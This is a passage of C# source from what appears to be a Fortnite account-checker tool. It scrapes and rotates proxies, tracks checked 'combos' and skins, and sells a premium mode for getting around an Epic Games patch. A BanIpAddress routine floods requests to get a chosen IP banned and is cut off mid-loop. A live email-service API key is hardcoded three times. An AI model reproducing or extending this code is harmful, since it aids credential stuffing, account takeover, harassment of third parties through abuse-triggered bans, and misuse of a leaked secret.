"IM", "JE", "BL", "MF" };
            private static string[] CountryNump = new[] {};
            public GeoIP(MemoryStream mss)
            {
                MS = mss;
            }
            public GeoIP()
            {
                FileStream FS = new FileStream(res, FileMode.Open, FileAccess.Read);
                MS = new MemoryStream();
                byte[] BY = new byte[257];
                while (FS.Read(BY, 0, BY.Length) != 0)
                    MS.Write(BY, 0, BY.Length);
                FS.Close();
            }

            public new string LookupCountryName(string IPA)
            {
                IPAddress ADR;
                try
                {
                    ADR = IPAddress.Parse(IPA);
                }
                catch (FormatException e)
                {
                    return "N/A";
                }
                return LookupCountryNameA(ADR);
            }

            public new string LookupCountryNameA(IPAddress addr)
            {
                return CountryName[System.Convert.ToInt32(SeekCountry(0, ConvertIPAddressToNumber(addr), 31))];
            }

            private long SeekCountry(long StartOffset, long IPNumber, int SearchDepth)
            {
                byte[] BUF_bytes = new byte[7];
                long[] x_long = new long[3];
                if (SearchDepth == 0)
                {
                }
                try
                {
                    MS.Seek(6 * StartOffset, 0);
                    MS.Read(BUF_bytes, 0, 6);
                }
                catch (IOException ex)
                {
                }
                int ITR;
                for (ITR = 0; ITR <= 1; ITR++)
                {
                    x_long[ITR] = 0;
                    int j;
                    for (j = 0; j <= 2; j++)
                    {
                        int PRT = BUF_bytes[(ITR * 3 + j)];
                        if (PRT < 0)
                            PRT += 256;
                        x_long[ITR] += vbShiftLeft(PRT, (j * 8));
                    }
                }
                if ((IPNumber & vbShiftLeft(1, SearchDepth)) > 0)
                {
                    if (x_long[1] >= CountryBegin)
                        return x_long[1] - CountryBegin;
                    return SeekCountry(x_long[1], IPNumber, SearchDepth - 1);
                }
                else
                {
                    if (x_long[0] >= CountryBegin)
                        return x_long[0] - CountryBegin;
                    return SeekCountry(x_long[0], IPNumber, SearchDepth - 1);
                }
            }

            private long vbShiftLeft(long Value, int Count)
            {
                int ITR;
                long xxxx;
                xxxx = Value;
                for (ITR = 1; ITR <= Count; ITR++)
                    xxxx = xxxx * 2;

                return xxxx;
            }
            private long vbShiftRight(long Value, int Count)
            {
                int ITR;
                long xyz;
                xyz = Value;
                for (ITR = 1; ITR <= Count; ITR++)
                    xyz = xyz / 2;

                return xyz;

            }

            private long ConvertIPAddressToNumber(IPAddress IPA)
            {
                try
                {
                    string ipar = IPA.ToString();
                    string[] ADR = ipar.Split('.');

                    int[] values = new int[4];
                    int i = 0;

                    foreach (string s in ADR)
                    {
                        values[i] = int.Parse(s);
                        i++;
                    }
                    return System.Convert.ToInt64(16777216 * values[0] + 65536 * values[1] + 256 * values[2] + values[3]);

                }
                catch
                {
                    return 0;
                }
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                XmlDocument document = new XmlDocument();
                document.Load("http://tcmtools.com/CheckerStuff/UsersOnlineCounter/index.php");
                string TimeResponse = document.InnerText;
                OnlineUserCount.Text = TimeResponse;
            }
            catch { }
        }

        private void RoyaleBomberSaveFile_CheckedChanged(object sender)
        {
            if (RoyaleBomberSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB36"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB36"] = "False";
                Settings.Default.Save();
            }
        }

        private void CandyAxeSaveFile_CheckedChanged(object sender)
        {
            if (CandyAxeSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB37"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB37"] = "False";
                Settings.Default.Save();
            }
        }

        private void RaidersRevengeSaveFile_CheckedChanged(object sender)
        {
            if (RaidersRevengeSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB38"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB38"] = "False";
                Settings.Default.Save();
            }
        }

        private void PowerChordSaveFile_CheckedChanged(object sender)
        {
            if (PowerChordSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB39"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB39"] = "False";
                Settings.Default.Save();
            }
        }

        private void SgtGreenCloverSaveFile_CheckedChanged(object sender)
        {
            if (SgtGreenCloverSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB40"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB40"] = "False";
                Settings.Default.Save();
            }
        }

        private void RenegadeSaveFile_CheckedChanged(object sender)
        {
            if (RenegadeSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB41"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB41"] = "False";
                Settings.Default.Save();
            }
        }

        private void AerialAssaultTrooperSaveFile_CheckedChanged(object sender)
        {
            if (AerialAssaultTrooperSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB42"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB42"] = "False";
                Settings.Default.Save();
            }
        }

        private void APIComboCheck()
        {
            if (APIBestProxiesChoose.SelectedItem.ToString() == "HTTP/S")
            {
                ProxyTypeAPI = "https";
            }
            else if (APIBestProxiesChoose.SelectedItem.ToString() == "SOCKS 4")
            {
                ProxyTypeAPI = "socks4";
            }
            else if (APIBestProxiesChoose.SelectedItem.ToString() == "SOCKS 5")
            {
                ProxyTypeAPI = "socks5";
            }
            else if (APIBestProxiesChoose.SelectedItem.ToString() == "HTTP")
            {
                ProxyTypeAPI = "http";
            }
            else
            {
                MessageBox.Show("Please Choose A Proxy Type");
            }
        }
        public static string ProxyTypeAPI;
        private void nsButton7_Click(object sender, EventArgs e)
        {
            try
            {
                APIComboCheck();
                string MainURL = "http://api.best-proxies.ru/proxylist.txt?key=";
                string KeyBeingUsed = BestProxiesAPI.Text;
                string MidURL = "&type=";
                string APIProxyType = ProxyTypeAPI;
                string EndURL = "&limit=0";
                string IPList = new WebClient().DownloadString(MainURL + KeyBeingUsed + MidURL + APIProxyType + EndURL);
                string str = IPList;
                Proxies.Clear();
                Proxies.AddRange(str.Split(Convert.ToChar('\n')));
                ProxiesLoadedFromAPI.Text = "Proxies Loaded: " + Proxies.Count.ToString();
            }
            catch
            {
                MessageBox.Show("You Must Enter A Key First And It Be Valid To Use This Feature");
            }
        }


        private void nsButton8_Click(object sender, EventArgs e)
        {
            Settings.Default["ProxiesAPI"] = BestProxiesAPI.Text;
            Settings.Default.Save();
        }

        public static string ProxiesScraped;
        public static string FinishedProxies;
        public static string sourceUrl;
        public static int TotalIpsGrabbed = 0;
        private void ScrapeSomeProxies_Click(object sender, EventArgs e)
        {
            if (Directory.Exists("JavaScript") && Directory.Exists("PhantomJS"))
            {
                try
                {
                    Thread GatherProxy = new Thread(GatherProxies);
                    CheckForIllegalCrossThreadCalls = false;
                    ProxyScraperLabel.Text = "Scraping Proxies... Please Wait!";
                    GatherProxy.Start();
                }
                catch
                { MessageBox.Show("Oops Something Fucked Up, Why Not Try And Give It Another Go Sweetie :)"); }
            }
            else
            {
                if (File.Exists("ScraperFiles.rar"))
                {
                    MessageBox.Show("Files already downloaded, Will open rar file for extraction!");
                    Process.Start("ScraperFiles.rar");
                }
                else
                {
                    DialogResult dialogResult = MessageBox.Show("Would You Like To Download The Required Files To Use This Functional?", "File Download Required!", MessageBoxButtons.YesNo);
                    if (dialogResult == DialogResult.Yes)
                    {
                        DownloadScraperFiles scraperfilesDL = new DownloadScraperFiles();
                        scraperfilesDL.Show();
                    }
                    else if (dialogResult == DialogResult.No)
                    {
                        //
                    }
                }
            }
        }


        private void GatherProxies()
        {
            CurrentPulledCombos.Text = "";
            TotalIpsGrabbed = 0;
            string tempdirectory = Path.GetTempPath();
            if (File.Exists(tempdirectory + "//Proxies.txt"))
            {
                File.Delete(tempdirectory + "//Proxies.txt");
            }
            sourceUrl = ProxyScraperURL.Text;
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = @"PhantomJS\phantomjs.exe",
                    Arguments = @"JavaScript\plainText.js " + sourceUrl,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };

            proc.Start();
            using (StreamReader reader = proc.StandardOutput)
            {
                string result = reader.ReadToEnd();

                // method 0: No tricks
                if (TotalIpsGrabbed == 0)
                {
                    ExtractProxies(result);
                }
                if (TotalIpsGrabbed == 0)
                {
                    ExtractProxies(Regex.Replace(result, @"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)[\t ]+([0-9]+)", @"$1:$2"));
                }
                if (TotalIpsGrabbed == 0)
                {
                    ExtractProxies(Regex.Replace(result, @"([0-9]+)[\t ]+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", @"$2:$1"));
                }
                if (TotalIpsGrabbed == 0)
                {
                    ExtractProxies(Regex.Replace(result, @"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):[\t ]+([0-9]+)", @"$1:$2"));
                }
                string TempDirectory = Path.GetTempPath();
                FinishedProxies = System.IO.File.ReadAllText(TempDirectory + "//Proxies.txt");
                string str = FinishedProxies;
                Proxies.AddRange(str.Split(Convert.ToChar('\n')));
                Proxies = RemoveDuplicatesIterative(Proxies);
                ProxyScraperLabel.Text = "Proxies Scraped/Loaded: " + Proxies.Count.ToString();
                CurrentPulledCombos.Text = String.Join(Environment.NewLine, Proxies);
            }
        }

        private void FastScrape(string url)
        {
            CurrentPulledCombos.Text = "";
            TotalIpsGrabbed = 0;
            sourceUrl = url;
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = @"PhantomJS\phantomjs.exe",
                    Arguments = @"JavaScript\plainText.js " + sourceUrl,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true

                }
            };

            proc.Start();
            using (StreamReader reader = proc.StandardOutput)
            {
                string result = reader.ReadToEnd();
                string tempdirectory = Path.GetTempPath();
                if (File.Exists(tempdirectory + "//Proxies.txt"))
                {
                    File.Delete(tempdirectory + "//Proxies.txt");
                }
                // method 0: No tricks
                if (TotalIpsGrabbed == 0)
                {
                    ExtractProxies(result);
                }
                if (TotalIpsGrabbed == 0)
                {
                    ExtractProxies(Regex.Replace(result, @"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)[\t ]+([0-9]+)", @"$1:$2"));
                }
                if (TotalIpsGrabbed == 0)
                {
                    ExtractProxies(Regex.Replace(result, @"([0-9]+)[\t ]+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", @"$2:$1"));
                }
                if (TotalIpsGrabbed == 0)
                {
                    ExtractProxies(Regex.Replace(result, @"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):[\t ]+([0-9]+)", @"$1:$2"));
                }
                string TempDirectory = Path.GetTempPath();
                FinishedProxies = System.IO.File.ReadAllText(TempDirectory + "//Proxies.txt");
                string str = FinishedProxies;
                Proxies.AddRange(str.Split(Convert.ToChar('\n')));
            }
        }

        public static List<string> RemoveDuplicatesIterative(List<string> items)
        {
            List<string> result = new List<string>();
            for (int i = 0; i < items.Count; i++)
            {
                // Assume not duplicate.
                bool duplicate = false;
                for (int z = 0; z < i; z++)
                {
                    if (items[z] == items[i])
                    {
                        // This is a duplicate.
                        duplicate = true;
                        break;
                    }
                }
                // If not duplicate, add to result.
                if (!duplicate)
                {
                    result.Add(items[i]);
                }
            }
            return result;
        }

        private void ExtractProxies(string result)
        {
            foreach (Match match in Regex.Matches(result, @"[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+"))
            {
                string[] server = match.Value.Split(':');
                string tempdirectory = Path.GetTempPath();
                using (StreamWriter ScrapedProxies = File.AppendText(tempdirectory + "//Proxies.txt"))
                {
                    ScrapedProxies.WriteLine(server[0] + ":" + server[1]);
                    TotalIpsGrabbed = TotalIpsGrabbed + 1;
                }
            }
        }

        private void ClearProxiesButton_Click(object sender, EventArgs e)
        {
            Proxies.Clear();
            CurrentPulledCombos.Text = "";
            TotalIpsGrabbed = 0;
            ProxyScraperLabel.Text = "Proxies Scraped/Loaded: " + Proxies.Count.ToString();
        }

        private void SaveSTWTiersToFiles_CheckedChanged(object sender)
        {
            if (SaveSTWTiersToFiles.Checked)
            {
                Properties.Settings.Default["SaveCB43"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB43"] = "False";
                Settings.Default.Save();
            }
        }

        private void RemoveWhenChecked_CheckedChanged(object sender)
        {
            if (RemoveWhenChecked.Checked)
            {
                Properties.Settings.Default["SaveCB44"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB44"] = "False";
                Settings.Default.Save();
            }
        }


        private void EnableRemoveBadProxies_CheckedChanged(object sender)
        {
            if (EnableRemoveBadProxies.Checked)
            {
                Properties.Settings.Default["SaveCB45"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB45"] = "False";
                Settings.Default.Save();
            }
        }

        private void RemoveProxiesWithErrors_CheckedChanged(object sender)
        {
            if (RemoveProxiesWithErrors.Checked)
            {
                Properties.Settings.Default["SaveCB46"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB46"] = "False";
                Settings.Default.Save();
            }
        }

        private void FastScrapeProxies()
        {
            TotalIpsGrabbed = 0;
            string tempdirectory = Path.GetTempPath();
            if (File.Exists(tempdirectory + "//Proxies.txt"))
            {
                File.Delete(tempdirectory + "//Proxies.txt");
            }
            FastScrape("http://www.proxyserverlist24.top/feeds/posts/default");
            File.WriteAllLines(tempdirectory + "//Proxies.txt", File.ReadAllLines(tempdirectory + "//Proxies.txt").Distinct());
            Proxies = RemoveDuplicatesIterative(Proxies);
            ProxyScraperLabel.Text = "Proxies Scraped/Loaded: " + Proxies.Count.ToString();
            CurrentPulledCombos.Text = String.Join(Environment.NewLine, Proxies);
        }

        private void FasterScrape_Click(object sender, EventArgs e)
        {
            if (Directory.Exists("JavaScript") && Directory.Exists("PhantomJS"))
            {
                try
                {
                    Thread FastProxiesScrape = new Thread(FastScrapeProxies);
                    CheckForIllegalCrossThreadCalls = false;
                    ProxyScraperLabel.Text = "Please Wait, May Take A While To Finish!";
                    FastProxiesScrape.Start();
                }
                catch
                {
                    MessageBox.Show("Oops Something Didn't Go Right, Give It Another Go!");
                }
            }
            else
            {
                if (File.Exists("ScraperFiles.rar"))
                {
                    MessageBox.Show("Files already downloaded, Will open rar file for extraction!");
                    Process.Start("ScraperFiles.rar");
                }
                else
                {
                    DialogResult dialogResult = MessageBox.Show("Would You Like To Download The Required Files To Use This Functional?", "File Download Required!", MessageBoxButtons.YesNo);
                    if (dialogResult == DialogResult.Yes)
                    {
                        DownloadScraperFiles scraperfilesDL = new DownloadScraperFiles();
                        scraperfilesDL.Show();
                    }
                    else if (dialogResult == DialogResult.No)
                    {
                        //
                    }
                }
            }
        }


        private void FnBattleRoyalLB_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        static string CalculateMD5(string filename)
        {
            using (var sha256 = SHA256.Create())
            {
                using (var stream = File.OpenRead(filename))
                {
                    var hash = sha256.ComputeHash(stream);
                    return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                }
            }
        }

        private void CheckAccountInfo_CheckedChanged(object sender)
        {
            if (CheckAccountInfo.Checked)
            {
                Properties.Settings.Default["SaveCB47"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB47"] = "False";
                Settings.Default.Save();
            }
        }

        private void RandomScrapeProxies()
        {
            Random RandomSite = new Random();
            string URLForProxies = new WebClient().DownloadString("https://pastebin.com/raw/Du0bfgz0");
            string[] RandomSiteSplit = URLForProxies.Split('|');
            string RanmdomSiteURL = RandomSiteSplit[RandomSite.Next(RandomSiteSplit.Length)];
            TotalIpsGrabbed = 0;
            string tempdirectory = Path.GetTempPath();
            if (File.Exists(tempdirectory + "//Proxies.txt"))
            {
                File.Delete(tempdirectory + "//Proxies.txt");
            }
            FastScrape(RanmdomSiteURL);
            ProxyScraperLabel.Text = "Scraping From:" + RanmdomSiteURL;
            File.WriteAllLines(tempdirectory + "//Proxies.txt", File.ReadAllLines(tempdirectory + "//Proxies.txt").Distinct());
            Proxies = RemoveDuplicatesIterative(Proxies);
            ProxyScraperLabel.Text = "Proxies Scraped/Loaded: " + Proxies.Count.ToString();
            CurrentPulledCombos.Text = String.Join(Environment.NewLine, Proxies);
        }

        private void nsButton9_Click(object sender, EventArgs e)
        {
            if (Directory.Exists("JavaScript") && Directory.Exists("PhantomJS"))
            {
                try
                {
                    Thread RandomProxySCraper = new Thread(RandomScrapeProxies);
                    CheckForIllegalCrossThreadCalls = false;
                    ProxyScraperLabel.Text = "Please Wait, Gathering Proxies.";
                    RandomProxySCraper.Start();
                }
                catch
                {
                    MessageBox.Show("Oops Something Didn't Go Right, Give It Another Go!");
                }
            }
            else
            {
                if (File.Exists("ScraperFiles.rar"))
                {
                    MessageBox.Show("Files already downloaded, Will open rar file for extraction!");
                    Process.Start("ScraperFiles.rar");
                }
                else
                {
                    DialogResult dialogResult = MessageBox.Show("Would You Like To Download The Required Files To Use This Functional?", "File Download Required!", MessageBoxButtons.YesNo);
                    if (dialogResult == DialogResult.Yes)
                    {
                        DownloadScraperFiles scraperfilesDL = new DownloadScraperFiles();
                        scraperfilesDL.Show();
                    }
                    else if (dialogResult == DialogResult.No)
                    {
                        //
                    }
                }
            }
        }

        private void multipleurls()
        {
            foreach (string line in ProxyListToScrapeMultiple.Lines)
            {
                string tempdirectory = Path.GetTempPath();
                Task task = Task.Run(() =>
                {
                    try
                    {
                        CurrentPulledCombos.Text = "";
                        TotalIpsGrabbed = 0;
                        ProxyScraperLabel.Text = "Please Wait, Gathering Proxies From: " + line;
                        if (File.Exists(tempdirectory + "//Proxies.txt"))
                        {
                            File.Delete(tempdirectory + "//Proxies.txt");
                        }
                        sourceUrl = line;
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = @"PhantomJS\phantomjs.exe",
                                Arguments = @"JavaScript\plainText.js " + sourceUrl,
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                CreateNoWindow = true
                            }
                        };

                        proc.Start();
                        using (StreamReader reader = proc.StandardOutput)
                        {
                            string result = reader.ReadToEnd();

                            // method 0: No tricks
                            if (TotalIpsGrabbed == 0)
                            {
                                ExtractProxies(result);
                            }
                            if (TotalIpsGrabbed == 0)
                            {
                                ExtractProxies(Regex.Replace(result, @"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)[\t ]+([0-9]+)", @"$1:$2"));
                            }
                            if (TotalIpsGrabbed == 0)
                            {
                                ExtractProxies(Regex.Replace(result, @"([0-9]+)[\t ]+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", @"$2:$1"));
                            }
                            if (TotalIpsGrabbed == 0)
                            {
                                ExtractProxies(Regex.Replace(result, @"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):[\t ]+([0-9]+)", @"$1:$2"));
                            }
                            string TempDirectory = Path.GetTempPath();
                            FinishedProxies = System.IO.File.ReadAllText(TempDirectory + "//Proxies.txt");
                            string str = FinishedProxies;
                            Proxies.AddRange(str.Split(Convert.ToChar('\n')));
                            Proxies = RemoveDuplicatesIterative(Proxies);
                            ProxyScraperLabel.Text = "Proxies Scraped/Loaded: " + Proxies.Count.ToString();
                            TotalProxiesScraped.Text = "Proxies Scraped: " + Proxies.Count().ToString();
                            CurrentPulledCombos.Text = String.Join(Environment.NewLine, Proxies);
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Error");
                    }
                });
                task.Wait();
            }
        }

        private void nsButton10_Click(object sender, EventArgs e)
        {
            if (Directory.Exists("JavaScript") && Directory.Exists("PhantomJS"))
            {
                try
                {
                    Thread MultiplesBoi = new Thread(multipleurls);
                    CheckForIllegalCrossThreadCalls = false;
                    MultiplesBoi.Start();
                }
                catch
                {
                    MessageBox.Show("Oops Something Didn't Go Right, Give It Another Go!");
                }
            }
            else
            {
                if (File.Exists("ScraperFiles.rar"))
                {
                    MessageBox.Show("Files already downloaded, Will open rar file for extraction!");
                    Process.Start("ScraperFiles.rar");
                }
                else
                {
                    DialogResult dialogResult = MessageBox.Show("Would You Like To Download The Required Files To Use This Functional?", "File Download Required!", MessageBoxButtons.YesNo);
                    if (dialogResult == DialogResult.Yes)
                    {
                        DownloadScraperFiles scraperfilesDL = new DownloadScraperFiles();
                        scraperfilesDL.Show();
                    }
                    else if (dialogResult == DialogResult.No)
                    {
                        //
                    }
                }
            }
        }

        private void nsButton11_Click(object sender, EventArgs e)
        {
            string tempdirectory = Path.GetTempPath();
            string URLforURLs = tempdirectory + "//SavedURLs.txt";
            File.WriteAllText(URLforURLs, String.Empty);
            using (StreamWriter SaveURLs = File.AppendText(URLforURLs))
            {
                SaveURLs.WriteLine(ProxyListToScrapeMultiple.Text);
            }
        }

        private void nsButton12_Click(object sender, EventArgs e)
        {
            string tempdirectory = Path.GetTempPath();
            ProxyListToScrapeMultiple.Text = System.IO.File.ReadAllText(tempdirectory + "//SavedURLs.txt");
        }

        private void ProxyListToScrapeMultiple_TextChanged(object sender, EventArgs e)
        {

        }

        private void ProxyListToScrapeMultiple_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            ProxyListToScrapeMultiple.Text = new WebClient().DownloadString("http://tcmtools.com/CheckerStuff/ProxyURLScraperFiles/List/List.txt");
        }

        private void NotifyPage_Click(object sender, EventArgs e)
        {

        }

        private void nsButton4_Click(object sender, EventArgs e)
        {
            Settings.Default["YourEmail"] = EmailToNotifyToo.Text;
            Settings.Default.Save();
        }

        private void EnableNotifyEmail_CheckedChanged(object sender)
        {
            if (EnableNotifyEmail.Checked)
            {
                CheckForTotalItemCount.Checked = true;
            }
            if (EnableNotifyEmail.Checked)
            {
                Properties.Settings.Default["SaveCB48"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB48"] = "False";
                Settings.Default.Save();
            }
        }

        private void IfStackedChecked_CheckedChanged(object sender)
        {
            if (IfStackedChecked.Checked)
            {
                Properties.Settings.Default["SaveCB49"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB49"] = "False";
                Settings.Default.Save();
            }
        }

        private void nsButton13_Click(object sender, EventArgs e)
        {

        }

        private void EmailSenderAPI(string EmailTitle, string EmailFromAddress, string EmailFromName, string EmailToAddress, string BodyForEmail)
        {
            ElasticEmailClient.Api.ApiKey = "adc07d05-2856-4ffa-9356-9fe41a0c4033";
            ElasticEmailClient.Api.Email.SendAsync(EmailTitle, EmailFromAddress, EmailFromName, null, null, null, null, null, null, null, new string[] { EmailToAddress }, null, null, null, null, null, null, null, BodyForEmail);
        }

        private void SMSSenderAPI(string EmailTitle, string EmailFromAddress, string EmailFromName, string EmailToAddress, string BodyForEmail)
        {
            ElasticEmailClient.Api.ApiKey = "adc07d05-2856-4ffa-9356-9fe41a0c4033";
            ElasticEmailClient.Api.Email.SendAsync(EmailTitle, EmailFromAddress, EmailFromName, null, null, null, null, null, null, null, new string[] { EmailToAddress }, null, null, null, null, null, null, null, null, BodyForEmail);
        }

        private void SendMessageWithTxt(string FromEmailMMS, string FromNameMMS, string FromSubjectMMS, string BodyTextMMS, string SendToMMS, string FilePathMMS, string FileNameFinalMMS, string BodyHTMLMMS)
        {
            NameValueCollection values = new NameValueCollection();
            values.Add("apikey", "adc07d05-2856-4ffa-9356-9fe41a0c4033");
            values.Add("from", FromEmailMMS);
            values.Add("fromName", FromNameMMS);
            values.Add("subject", FromSubjectMMS);
            values.Add("bodyText", BodyTextMMS);
            values.Add("to", SendToMMS);
            values.Add("bodyHtml", BodyHTMLMMS);

            var filepath = FilePathMMS;
            var file = File.OpenRead(filepath);

            var filesStream = new Stream[] { file };
            var filenames = new string[] { FileNameFinalMMS };
            var URL = "https://api.elasticemail.com/v2/email/send";

            string result = EmailSender(URL, values, filesStream, filenames);
        }

        public static string EmailSender(string actionUrl, NameValueCollection values, Stream[] paramFileStream = null, string[] filenames = null)
        {
            using (var client = new HttpClient())
            using (var formData = new MultipartFormDataContent())
            {
                foreach (string key in values)
                {
                    System.Net.Http.HttpContent stringContent = new System.Net.Http.StringContent(values[key]);
                    formData.Add(stringContent, key);
                }

                for (int i = 0; i < paramFileStream.Length; i++)
                {
                    System.Net.Http.HttpContent fileStreamContent = new System.Net.Http.StreamContent(paramFileStream[i]);
                    formData.Add(fileStreamContent, "file" + i, filenames[i]);
                }

                var response = client.PostAsync(actionUrl, formData).Result;
                if (!response.IsSuccessStatusCode)
                {
                    throw new Exception(response.Content.ReadAsStringAsync().Result);
                }

                return response.Content.ReadAsStringAsync().Result;
            }
        }

        private void nsButton15_Click(object sender, EventArgs e)
        {
            try
            {
                EmailSenderAPI("Test Email From TCM Tool", "mailer@fortnite.exposed", "TCM Fortnite Tool", EmailToNotifyToo.Text, "Hello, This is just a test email from TCM Tool, If you are seeing this your config is proper :)");
                MessageBox.Show("Message Successfully Sent, Check Your Email :)\nIf The Email Was Sent To SPAM, Please Add The Email to Your Contacts So This No Longer Happens!");
            }
            catch (Exception ex)
            {
                MessageBox.Show("There Was An Error Sending Your Email, Sorry!");
                MessageBox.Show(ex.Message);
            }
        }

        private void EmailSentTXT_CheckedChanged(object sender)
        {
            if (EmailSentTXT.Checked)
            {
                Properties.Settings.Default["SaveCB50"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB50"] = "False";
                Settings.Default.Save();
            }
            if (EmailSentTXT.Checked)
            {
                EmailSendHTML.Checked = false;
            }
        }

        private void EmailSendHTML_CheckedChanged(object sender)
        {
            if (EmailSendHTML.Checked)
            {
                Properties.Settings.Default["SaveCB51"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB51"] = "False";
                Settings.Default.Save();
            }
            if (EmailSendHTML.Checked)
            {
                EmailSentTXT.Checked = false;
            }
        }

        private void FinalFileHasTextFile_CheckedChanged(object sender)
        {
            if (FinalFileHasTextFile.Checked)
            {
                Properties.Settings.Default["SaveCB52"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB52"] = "False";
                Settings.Default.Save();
            }
        }

        private void SendFinalEmailOnly_CheckedChanged(object sender)
        {
            if (SendFinalEmailOnly.Checked)
            {
                Properties.Settings.Default["SaveCB53"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB53"] = "False";
                Settings.Default.Save();
            }
        }

        private void nsButton13_Click_1(object sender, EventArgs e)
        {
            if (TextNowNotificationsText.Text.Contains("@textnow.me"))
            {
                MessageBox.Show("Only Put The First Part Of The Address (So Remove Any @...)");
            }
            else
            {
                try
                {
                    SMSSenderAPI("Test Email From TCM Tool", "mailer@fortnite.exposed", "TCM Fortnite Tool", TextNowNotificationsText.Text + "@textnow.me", "Hello, This is just a test email from TCM Tool, If you are seeing this your config is proper :)\n\n\n\n");
                    MessageBox.Show("Looks Like The Sending Wen't Good, Check Your Phone To Double Check :)");
                }
                catch
                {
                    MessageBox.Show("There Was An Error Sending Your Email, Sorry!");
                }
            }
        }

        private void EnableTextNowNotify_CheckedChanged(object sender)
        {
            if (EnableTextNowNotify.Checked)
            {
                Properties.Settings.Default["SaveCB54"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB54"] = "False";
                Settings.Default.Save();
            }
        }

        private void nsButton14_Click(object sender, EventArgs e)
        {
            Settings.Default["YourSMS"] = TextNowNotificationsText.Text;
            Settings.Default.Save();
        }

        private void nsGroupBox17_Click(object sender, EventArgs e)
        {

        }
        bool ProxyV2Enabled = false;
        private void cmbProxyType_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cmbProxyType.Text == "Proxyless V2")
            {
                if (IsPremiumUser == "True")
                {
                    //MessageBox.Show("Epicgames has currently patched proxylesse method, Looking into a new one. Temp disabled.");
                    //cmbProxyType.SelectedIndex = cmbProxyType.FindStringExact("HTTP/S");
                    ProxyV2Enabled = true;
                }
                else if (IsPremiumUser == "False")
                {
                    cmbProxyType.SelectedIndex = cmbProxyType.FindStringExact("HTTP/S");
                    MessageBox.Show("You are not premium user, You must be premium to use this feature!");
                }
            }
        }

        private void cmbProxyType_SelectedValueChanged(object sender, EventArgs e)
        {
            if (cmbProxyType.Text == "Proxyless V2")
            {
                if (IsPremiumUser == "True")
                {
                    ProxyV2Enabled = true;
                }
                else if (IsPremiumUser == "False")
                {
                    cmbProxyType.SelectedIndex = cmbProxyType.FindStringExact("HTTP/S");
                    MessageBox.Show("You are not premium user, You must be premium to use this feature!");
                }
            }
        }

        private void BanIpAddress()
        {
            if (System.Net.IPAddress.TryParse(IpAddressToTab.Text, out myAddress))
            {
                int BanLoop = 0;
                BanThereIP.Enabled = false;
                IpAddressToTab.Enabled = false;
                while (BanLoop < 50)
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        httpRequest.ClearAllHeaders();
                        int ProxyTimeoutTimer = (int)ProxyTimeout.Value;
                        httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0";
                        httpRequest.KeepAlive = true;
                        httpRequest.Cookies = new CookieDictionary(false);
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.ConnectTimeout = ProxyTimeoutTimer;
                        httpRequest.AllowAutoRedirect = false;
                        if (Proxies.Count == 0)
                        {
                            httpRequest.Proxy = null;
                        }
                        else
                        {
                            httpRequest.Proxy = GetPClient(Proxies.ElementAt<string>(rnd.Next(Proxies.Count)));
                            httpRequest.Proxy.ConnectTimeout = ProxyTimeoutTimer;
                        }
                        Random randomGenerator = new Random();
                        int RandomEmail = randomGenerator.Next(100000);
